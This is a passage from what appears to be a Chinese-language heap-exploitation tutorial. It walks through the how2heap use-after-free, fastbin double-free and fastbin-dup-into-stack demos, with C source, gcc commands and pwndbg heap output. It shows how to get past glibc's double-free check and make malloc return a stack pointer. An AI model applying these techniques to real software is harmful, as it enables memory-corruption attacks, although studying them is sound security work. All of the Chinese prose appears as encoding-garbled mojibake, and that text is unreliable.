class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure><p>Unsortedbin ä¹Ÿè¢«å–å‡ºã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814164027.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814164027.png"></a></p><p>æˆ‘ä»¬å‘ç°åœ¨åŸæ¥ chunk A çš„ä½ç½® ä¹Ÿæ˜¯chunk C çš„ä½ç½®ã€‚ä¸ºä»€ä¹ˆç”¨â€œä¹Ÿâ€å‘¢ï¼Ÿå› ä¸ºå¦‚æœå»æ‰“å° chunk A çš„æŒ‡é’ˆæˆ‘ä»¬ä¹Ÿä¼šæ‰“å°å‡º â€œThis is Câ€ çš„å­—ç¬¦ä¸²ã€‚    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; p &amp;a</span><br><span class="line"><span class="variable">$3</span> = (char **) 0x7fffffffe408</span><br><span class="line">Pwndbg&gt; x/20a 0x7fffffffe408</span><br><span class="line">0x7fffffffe408:0x6020100x602220</span><br><span class="line">0x7fffffffe418:0x6020100x4008e0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffe428:0x7ffff7a303f1 &lt;__libc_start_main+241&gt;0x40000</span><br><span class="line">0x7fffffffe438:0x7fffffffe5080x1f7b9a488</span><br><span class="line">0x7fffffffe448:0x400616 &lt;main&gt;0x0</span><br><span class="line">0x7fffffffe458:0x873c9590c5edf93b0x400520 &lt;_start&gt;</span><br><span class="line">0x7fffffffe468:0x7fffffffe5000x0</span><br><span class="line">0x7fffffffe478:0x00x78c36aef1c4df93b</span><br><span class="line">0x7fffffffe488:0x78c37a56d37ff93b0x0</span><br><span class="line">0x7fffffffe498:0x00x0</span><br><span class="line">Pwndbg&gt; x/20a 0x602010</span><br><span class="line">0x602010:0x20736920736968740x7ffff7002143</span><br><span class="line">0x602020:0x00x0</span><br><span class="line">0x602030:0x00x0</span><br><span class="line">0x602040:0x00x0</span><br><span class="line">0x602050:0x00x0</span><br><span class="line">0x602060:0x00x0</span><br><span class="line">0x602070:0x00x0</span><br><span class="line">0x602080:0x00x0</span><br><span class="line">0x602090:0x00x0</span><br><span class="line">0x6020a0:0x00x0</span><br><span class="line">Pwndbg&gt; p a</span><br><span class="line"><span class="variable">$4</span> = 0x602010 <span class="string">&quot;this is C!&quot;</span></span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ä»è¿™æˆ‘ä»¬å°±ä¼šå‘ç° æˆ‘ä»¬å»æ‰“å° açš„å†…å®¹ï¼Œaçš„å†…å®¹ä¹Ÿæ˜¯â€˜this is Câ€™ã€‚è¿™ä¸ªå°±æ˜¯ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„ <strong>use-after-free</strong> æ¼æ´ã€‚</p><hr><p>uaf é€ æˆåŸå› ï¼š</p><pre><code>æŒ‡é’ˆfree æ‰åå¹¶æ²¡æœ‰ç½®0</code></pre><hr><h3 id="0x2-fastbin-dup"><a href="#0x2-fastbin-dup" class="headerlink" title="0x2 fastbin_dup"></a>0x2 fastbin_dup</h3><p>Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist. </p><p>fastbin æœºåˆ¶ä¸‹çš„ double freeã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸ªç¨‹åºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>     <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="number">21</span>     <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">23</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">free</span>(b);</span><br><span class="line"><span class="number">25</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠ21 è¡Œçš„æ³¨é‡Šå»æ‰ã€‚ç¼–è¯‘ç¨‹åºå¹¶è¿è¡Œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates a simple double-free attack with fastbins.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0xb74010</span><br><span class="line">2nd malloc(8): 0xb74030</span><br><span class="line">3rd malloc(8): 0xb74050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0xb74010 again, things will crash because 0xb74010 is at the top of the free list.</span><br><span class="line">*** Error <span class="keyword">in</span> `./fastbin_dup_double_free<span class="string">&#x27;: double free or corruption (fasttop): 0x0000000000b74010 ***</span></span><br><span class="line"><span class="string">======= Backtrace: =========</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x790cb)[0x7fe7c6e7d0cb]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(+0x82c9a)[0x7fe7c6e86c9a]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fe7c6e8ad8c]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x400740]</span></span><br><span class="line"><span class="string">/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf1)[0x7fe7c6e243f1]</span></span><br><span class="line"><span class="string">./fastbin_dup_double_free[0x40054a]</span></span><br><span class="line"><span class="string">======= Memory map: ========</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è¿è¡Œç¨‹åºåï¼Œç¨‹åºå‘ç”Ÿäº†æ˜æ˜¾çš„æŠ¥é”™ï¼Œè¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ **double free **ã€‚æ„å‘³é€šå¸¸è€Œè¨€ï¼Œä¸€ä¸ªå·²ç» free æ‰çš„ chunk æ˜¯ä¸èƒ½è¢« free ç¬¬äºŒæ¬¡çš„ã€‚ç„¶åæˆ‘ä»¬æŠŠåŸæœ¬çš„æ³¨é‡ŠåŠ ä¸Šã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="number">18</span>     <span class="built_in">free</span>(a);</span><br><span class="line"><span class="number">19</span></span><br><span class="line"><span class="number">20</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="number">21</span>     <span class="comment">//free(a);</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">23</span>     <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>ç„¶åé‡æ–°ç¼–è¯‘ã€‚<code>gcc -g -no-pie fastbin_dup.c -o fastbin_dup</code>  å¹¶ä¸Šè°ƒè¯•å™¨ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814165413.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180814165413.png"></a></p><p>é¦–å…ˆç¨‹åº malloc äº†ä¸‰ä¸ª chunk ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; heap</span><br><span class="line">Top Chunk: 0x602060</span><br><span class="line">Last Remainder: 0</span><br><span class="line"></span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602020 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602040 FASTBIN &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x21,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x20fa1</span><br><span class="line">&#125;</span><br><span class="line">0x602060 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x20fa1,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶å free(a)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">15</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line">  <span class="number">16</span></span><br><span class="line">  <span class="number">17</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">â–º <span class="number">18</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">19</span></span><br><span class="line">  <span class="number">20</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line">  <span class="number">21</span> <span class="comment">//free(a);</span></span><br></pre></td></tr></table></figure><p>free(b)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">22</span></span><br><span class="line">  <span class="number">23</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">  <span class="number">24</span> <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="number">25</span></span><br><span class="line">â–º <span class="number">26</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">  <span class="number">27</span> <span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ï¼Œfastbin å½¢æˆä¸€ä¸ª fastbin freelist</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602020 â€”â–¸ 0x602000 â—‚â€” 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>chunk A  â€”&gt; chunk B</p><p>ç„¶åæˆ‘ä»¬å†æŠŠ a free ä¸€æ¬¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">22</span></span><br><span class="line">  <span class="number">23</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line">  <span class="number">24</span> <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="number">25</span></span><br><span class="line">  <span class="number">26</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line">â–º <span class="number">27</span> <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">28</span></span><br><span class="line">  <span class="number">29</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">  <span class="number">30</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">  <span class="number">31</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">  <span class="number">32</span> <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°è¿™æ¬¡å¹¶æ²¡æœ‰å‘ç”ŸæŠ¥é”™ã€‚å½¢æˆäº†å¦‚ä¸‹çš„ free listã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602000 â€”â–¸ 0x602020 â—‚â€” 0x602000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure><p>â€”â€”â€”â€”â€”     â€”â€”â€”â€”â€”      â€”â€”â€”â€”â€” </p><p>|Chunk A| -&gt; |chunk B| â€“&gt;| chunk A|</p><p>â€”â€”â€”â€”â€”     â€”â€”â€”â€”â€”      â€”â€”â€”â€”â€” </p><pre><code>                              /\                          |                              |  ------------- -------</code></pre><p>å¤§æ¦‚å¦‚ä¸Šä¸ªå›¾ï¼Œè¿™æ ·æˆ‘ä»¬å°±æˆåŠŸç»•è¿‡äº† fastbins çš„double freeæ£€æŸ¥ã€‚åŸå› å¦‚ä¸‹ï¼š</p><p>fastbins å¯ä»¥çœ‹æˆä¸€ä¸ª LIFO çš„æ ˆï¼Œä½¿ç”¨å•é“¾è¡¨å®ç°ï¼Œé€šè¿‡ fastbin-&gt;fd æ¥éå† fastbinsã€‚ç”±äº free çš„è¿‡ç¨‹ä¼šå¯¹ free list åšæ£€æŸ¥ï¼Œæˆ‘ä»¬ä¸èƒ½è¿ç»­ä¸¤æ¬¡ free åŒä¸€ä¸ª chunkï¼Œæ‰€ä»¥è¿™é‡Œåœ¨ä¸¤æ¬¡ free ä¹‹é—´ï¼Œå¢åŠ äº†ä¸€æ¬¡å¯¹å…¶ä»– chunk çš„ free è¿‡ç¨‹ï¼Œä»è€Œç»•è¿‡æ£€æŸ¥é¡ºåˆ©æ‰§è¡Œã€‚ç„¶åå† malloc ä¸‰æ¬¡ï¼Œå°±åœ¨åŒä¸€ä¸ªåœ°å€ malloc äº†ä¸¤æ¬¡ï¼Œä¹Ÿå°±æœ‰äº†ä¸¤ä¸ªæŒ‡å‘åŒä¸€å—å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆã€‚</p><h3 id="0x3-fastbin-dup-into-stack"><a href="#0x3-fastbin-dup-into-stack" class="headerlink" title="0x3 fastbin_dup_into_stack"></a>0x3 fastbin_dup_into_stack</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span></span><br><span class="line">       <span class="string">&quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, <span class="number">8</span>+(<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. &quot;</span></span><br><span class="line"><span class="string">&quot;We&#x27;ll now carry out our attack by modifying data at %p.\n&quot;</span>, a, b, a, a);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, d);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p ].\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span></span><br><span class="line"><span class="string">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span></span><br><span class="line"><span class="string">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span></span><br><span class="line"><span class="string">&quot;return a pointer to it.\n&quot;</span>, a);</span><br><span class="line">stack_var = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;</span>, a);</span><br><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;4th malloc(8): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€šç”¨çš„ï¼Œç¼–è¯‘åæˆ‘ä»¬ 